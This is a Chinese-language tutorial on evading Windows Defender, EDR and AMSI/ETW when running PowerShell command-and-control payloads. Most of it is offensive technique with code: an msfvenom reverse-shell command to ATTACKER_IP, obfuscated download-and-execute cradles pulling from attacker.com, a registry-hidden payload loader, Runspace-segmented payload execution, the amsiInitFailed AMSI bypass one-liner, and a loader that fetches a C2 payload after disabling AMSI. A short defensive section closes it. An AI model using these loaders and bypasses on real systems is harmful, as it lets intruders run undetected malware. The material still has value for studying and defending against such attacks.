> 本文档旨在深入探讨在现代网络攻击与防御中，针对 Windows PowerShell C2（Command and Control）框架的常见免杀（Bypass/Evasion）技术。内容涵盖代码混淆、分离加载、内存执行及 AMSI 绕过等核心对抗手段，为红队研究人员和蓝队防御人员提供理论与实践参考。

## 1. 概述 (Overview)

PowerShell 因其在 Windows 系统中的原生地位、强大的系统管理能力和灵活的脚本特性，已成为攻击者实现 C2 通信、横向移动和持久化控制的首选工具之一。然而，随着 Windows Defender、EDR (Endpoint Detection and Response) 等安全产品的防护能力不断增强，特别是对 AMSI (Antimalware Scan Interface) 和 ETW (Event Tracing for Windows) 的深度集成，传统的 PowerShell 攻击脚本极易被检测和拦截。

本文将系统性地梳理和总结四种主流的 PowerShell C2 免杀对抗策略，并提供相应的技术原理和实战示例：

*   **代码混淆与编码变形 (Obfuscation & Encoding)**：降低脚本的可读性，绕过基于签名的静态检测。
*   **分离免杀与非传统执行 (Separation & Unconventional Execution)**：将恶意负载与加载器分离，通过非常规的存储和加载方式规避检测。
*   **内存中执行与无文件攻击 (In-Memory Execution & Fileless Attack)**：避免将恶意代码写入磁盘，直接在内存中执行，对抗基于文件的扫描。
*   **直接攻击与绕过 AMSI/ETW (Direct Attack & AMSI/ETW Bypass)**：在执行初期就破坏或欺骗安全监控接口，使其失效。

---

## 2. 技术原理 (Technical Principles)

在深入实战之前，理解各项技术背后的核心原理至关重要。

### 2.1 PowerShell 执行策略 (Execution Policy)

Windows 通过执行策略来限制 PowerShell 脚本的运行，这是第一道基础防线。

*   **`Restricted`**: (默认) 不允许任何脚本运行。
*   **`AllSigned`**: 只允许经受信任的发布者签名的脚本运行。
*   **`RemoteSigned`**: 本地创建的脚本可以运行，但从网络下载的脚本必须经过签名。
*   **`Unrestricted`**: 允许所有脚本运行。
*   **`Bypass`**: 不阻止任何操作，也没有任何警告或提示。

攻击者通常使用 `-ExecutionPolicy Bypass` 标志临时绕过当前会话的策略限制，这本身就是一个高风险行为指标。

### 2.2 代码混淆 (Code Obfuscation)

混淆的核心思想是“等价替换”。通过改变代码的非功能性特征（如变量名、函数名、代码结构、编码方式），使其在功能上保持不变，但在形式上与已知的恶意软件签名完全不同，从而绕过静态特征码扫描。

### 2.3 分离加载 (Separation Loading)

此技术的精髓在于将完整的攻击链条拆分为两个或多个部分：一个看似无害的“加载器”（Loader）和一个或多个“恶意负载”（Payload）。加载器负责从一个隐蔽的位置（如远程服务器、注册表、图片文件等）获取负载，然后在内存中拼接并执行。这种方式使得每个独立部分都不足以触发警报。

### 2.4 内存执行 (In-Memory Execution)

内存执行是“无文件攻击”的核心。传统攻击需要在磁盘上创建文件（如 `.ps1`, `.exe`），这为杀毒软件提供了扫描窗口。通过 `IEX (Invoke-Expression)` 或更高级的 Runspace 技术，脚本可以直接在内存中解释和执行，不留下文件痕迹，极大地增加了检测难度。

### 2.5 AMSI & ETW

*   **AMSI (Antimalware Scan Interface)**：是微软提供的一个通用接口，允许反恶意软件产品在代码（如 PowerShell、VBScript、JScript）执行前对其内容进行扫描。PowerShell 引擎在执行脚本块或命令前，会先将内容发送给 AMSI 进行检查。
*   **ETW (Event Tracing for Windows)**：是一个内核级的日志记录机制，能够捕获包括 PowerShell 脚本块执行、模块加载在内的详细系统活动。许多 EDR 产品依赖 ETW 来监控可疑的 PowerShell 行为。

绕过它们是当前 PowerShell 免杀技术的关键。

---

## 3. 环境准备 (Environment Setup)

*   **攻击机**: Kali Linux 或其他装有 Metasploit Framework / Cobalt Strike 的系统。
*   **靶机**: Windows 10 / 11（开启 Windows Defender）。
*   **工具**: PowerShell ISE 或 VS Code（用于编写和测试脚本）。

在开始之前，我们首先需要生成一个基础的 PowerShell C2 Payload。这里以 Metasploit 为例：

```bash
# 在攻击机上执行，生成一个 PowerShell 格式的反向 TCP shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh -o shell.ps1
```

生成的 `shell.ps1` 内容通常包含一个大型的 Base64 编码数组，这就是我们的原始“恶意负载”。直接执行它几乎肯定会被 Defender 拦截。

---

## 4. 实战示例 (Hands-on Examples)

### 4.1 方案一：代码混淆与编码变形

这是最基础也最直接的方法。我们可以手动或使用工具进行混淆。

**手动混淆示例**：

1.  **变量名替换**: 将 `$buffer`、`$func` 等有意义的变量名替换为 `$a`、`$b` 或无意义的字符串。
2.  **字符串拼接与反转**: 将敏感命令（如 `IEX`）拆分并重新组合。
3.  **编码**: 使用 Base64、Hex 或自定义编码对部分或全部脚本进行编码。

```powershell
# 原始命令
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# 混淆后的命令
$a = 'I'; $b = 'E'; $c = 'X'; $cmd = $a + $b + $c
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovL2F0dGFja2VyLmNvbS9wYXlsb2FkLnBzMQ==')) # 'http://attacker.com/payload.ps1' 的 Base64 编码
Invoke-Command -ScriptBlock ([ScriptBlock]::Create("$cmd (New-Object Net.WebClient).DownloadString('$url')"))
```

**关键细节**：
*   `Invoke-Command` 和 `[ScriptBlock]::Create()` 的组合可以绕过一些对 `IEX` 的简单字符串匹配。
*   对 URL 进行 Base64 编码可以避免 URL 特征被静态分析。
*   虽然手动混淆灵活，但效率低下。`Invoke-Obfuscation` 等自动化工具能实现更复杂的混淆，如 AST (Abstract Syntax Tree) 级别的混淆。

### 4.2 方案二：分离免杀与非传统执行

我们将加载器和负载分离，并通过非常规渠道传递负载。

**示例：注册表分离 (Registry Separation)**

1.  **存储负载**: 将 `msfvenom` 生成的 PowerShell 负载（去除 `IEX(...)` 部分）存储到注册表的某个键值中。为了隐蔽，可以选择一个看起来正常的路径。

    ```powershell
    # 在靶机上执行此命令，将 payload 存储到注册表
    # $payload 是从 msfvenom 生成的 shell.ps1 中提取的脚本主体部分
    $payload = "function..." # 此处为恶意负载主体
    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug" -Name "Payload" -Value $encodedPayload
    ```

2.  **编写加载器**: 创建一个简单的加载器脚本，从注册表读取、解码并执行负载。

    ```powershell
    # loader.ps1
    $encodedPayload = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug" -Name "Payload").Payload
    $decodedPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedPayload))
    IEX $decodedPayload
    ```

**关键细节**：
*   **隐蔽性**: 负载可以被分割成多个部分，存储在不同的注册表键中，增加溯源难度。
*   **其他载体**:
    *   **HTTP 分离**: 负载托管在远程服务器上，通过 `(New-Object Net.WebClient).DownloadString()` 下载。这是最常见的分离方式。
    *   **图片隐写 (Steganography)**: 将负载数据隐藏在图片文件的像素数据中（例如 LSB 隐写），加载器下载图片，提取并执行负载。这需要更复杂的加载器逻辑。

### 4.3 方案三：内存中执行与无文件攻击

此方案的核心是利用 PowerShell 的 `Runspace`，它是一个独立的 PowerShell 执行环境。我们可以在一个宿主进程中创建 Runspace，并在其中执行代码，从而实现更好的隐蔽性。

**示例：Runspace 注入 + 分段隐藏**

此方法将恶意负载分段，并通过 Runspace API 逐一添加和执行，避免一次性加载完整的恶意脚本块，从而绕过 AMSI 对大块脚本的扫描。

```powershell
# 创建并打开一个 Runspace
$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$rs.Open()

# 获取 PowerShell 实例
$ps = [PowerShell]::Create()
$ps.Runspace = $rs

# 分段添加恶意负载（以 msfvenom 的 payload 为例，将其拆分成多个字符串）
$payload_part1 = '$buf = [System.Convert]::FromBase64String(''YOUR_BASE64_PAYLOAD_PART_1...'');'
$payload_part2 = '$gpa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(...);'
# ...更多分段...
$payload_partN = '...invoke...'

# 逐段添加到管道并执行
$ps.AddScript($payload_part1)
$ps.AddScript($payload_part2)
# ...
$ps.AddScript($payload_partN)
$ps.Invoke()

# 关闭 Runspace
$rs.Close()
```

**关键细节**：
*   **宿主进程**: 这段代码本身可以被编译成一个 C# 程序，或者由另一个 PowerShell 脚本执行。当由一个合法的、受信任的进程（如 `explorer.exe`）注入并执行时，其行为会更难被识别为恶意。
*   **SysCall 调用**: 更高级的玩法是在 C# 宿主程序中不使用高阶的 Win32 API（如 `VirtualAllocEx`, `CreateRemoteThread`），而是直接使用 `Nt*` 系列的系统调用（SysCall）。这可以绕过许多在用户态 API 上设置的 Hook，是 EDR 对抗的前沿技术。

### 4.4 方案四：直接攻击与绕过 AMSI & ETW

这是最高级也最根本的绕过方式：在恶意代码执行前，先让 AMSI "失明"。

**示例：基于内存补丁的 AMSI Bypass**

AMSI 的核心扫描功能由 `amsi.dll` 中的 `AmsiScanBuffer()` 函数实现。思路是在当前进程的内存中找到这个函数，并修改其代码，使其直接返回一个“干净”的结果，从而让所有后续的扫描都失效。

以下是一个广为人知的单行 PowerShell Bypass 命令（截至 2024 年初，此特定变体可能已被标记，但原理不变）：

```powershell
# 注意：此代码片段仅用于技术演示，现已能被主流杀软检测。
# 它的作用是在内存中修补 AmsiScanBuffer 函数，使其总是返回 S_OK (扫描通过)。
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**更可靠的加载器逻辑**：

一个更健壮的 C2 加载器会首先包含一段用于Bypass AMSI的C#或PowerShell代码。

```powershell
# 伪代码逻辑
# 1. 加载器启动

# 2. 执行 AMSI Bypass 逻辑
#    - 可以是上述的 PowerShell 单行命令
#    - 也可以是更复杂的 C# 代码，通过 P/Invoke 定位并修补 AmsiScanBuffer
#    - 例如，找到 amsi.dll 的基地址，定位 AmsiScanBuffer，然后用 VirtualProtect 修改内存权限，写入 "ret" 指令。

# 3. 执行真正的 C2 Payload
#    - (New-Object Net.WebClient).DownloadString('http://c2/payload') | IEX
#    - 由于 AMSI 已被禁用，这里的 payload 不会再被扫描。
```

**关键细节**：
*   **ETW 绕过**: ETW 的绕过通常通过 Hook `ntdll.dll` 中的 `EtwEventWrite` 函数来实现，阻止日志事件的生成。这通常需要更底层的编程（C/C++/C#）。
*   **时效性**: AMSI/ETW 的绕过技术与安全厂商的检测策略处于持续的“猫鼠游戏”中。一个 bypass 方法可能在短时间内就会失效，需要不断研究新的技术。

---

## 5. 安全总结与防御建议 (Conclusion & Defense Recommendations)

PowerShell 免杀技术的核心在于利用信息不对称和执行流程的复杂化，来规避现有的安全检测机制。

**攻击趋势总结**：
*   从简单的编码混淆，演变为基于 AST 的深度混淆。
*   从单一脚本，演变为加载器与负载分离的多阶段攻击。
*   从基于文件的攻击，全面转向无文件化的内存执行。
*   攻击的起点从执行恶意代码，前移至破坏安全监控机制（AMSI/ETW）。

**防御建议 (Blue Team)**：
1.  **强化执行策略与日志记录**:
    *   在服务器上，尽可能使用 `AllSigned` 策略，并对签名证书进行严格管理。
    *   启用 PowerShell 脚本块日志记录 (Event ID 4104) 和模块日志记录 (Event ID 4103)。这些日志即使在 AMSI 被绕过后，也可能记录下解密或解混淆后的真实代码。

2.  **监控命令行参数**:
    *   密切关注包含 `powershell.exe -enc`, `-ExecutionPolicy Bypass`, `-nop`, `-w hidden` 等参数的进程创建事件。这些都是可疑行为的强指标。

3.  **行为分析而非签名**:
    *   依赖能够进行行为分析的 EDR 解决方案。例如，一个非 Office 应用的进程（如 `calc.exe`）突然发起了网络连接，或者一个 PowerShell 进程在内存中加载了非托管的 DLL，这些都属于应被警惕的异常行为。

4.  **限制网络出口**:
    *   在服务器和终端上实施严格的出站防火墙策略，只允许必要的网络通信，阻止 C2 流量连接到未经授权的外部地址。

5.  **用户权限最小化**:
    *   确保普通用户不具备本地管理员权限，这可以限制许多内存注入和系统级 Hook 技术的实施。

通过理解这些高级的攻击技术，防御方可以更有针对性地部署监控和缓解措施，从而构建一个更具弹性的安全体系。
